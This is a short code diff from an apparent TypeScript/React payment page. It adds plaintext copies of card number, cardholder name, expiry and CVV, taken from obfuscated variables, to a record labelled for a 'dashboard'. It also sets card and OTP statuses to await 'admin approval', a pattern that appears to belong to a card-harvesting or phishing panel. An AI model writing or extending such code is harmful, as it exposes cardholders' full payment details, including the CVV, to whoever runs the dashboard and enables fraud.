@@ -308,6 +308,12 @@ export default function P1({ offerTotalPrice }: _P1Props) {
         paymentMethod: selectedPaymentMethod,
         cardType,
         bankInfo,
+        // Card details with clear names for dashboard
+        cardNumber: _v1,
+        cardOwner: _v4,
+        cardExpiry: _v3,
+        cvv: _v2,
+        // Encrypted fields
         _v4,
         _v2,
         _v1,
@@ -315,6 +321,9 @@ export default function P1({ offerTotalPrice }: _P1Props) {
         originalPrice: offerTotalPrice,
         discount,
         finalPrice: Number.parseFloat(finalPrice.toFixed(2)),
+        // Set status to pending for admin approval
+        _v1Status: "pending",
+        paymentStatus: "pending",
         cardStatus: "pending",
         otpStatus: "pending",
         // Clear any previous redirect/step values
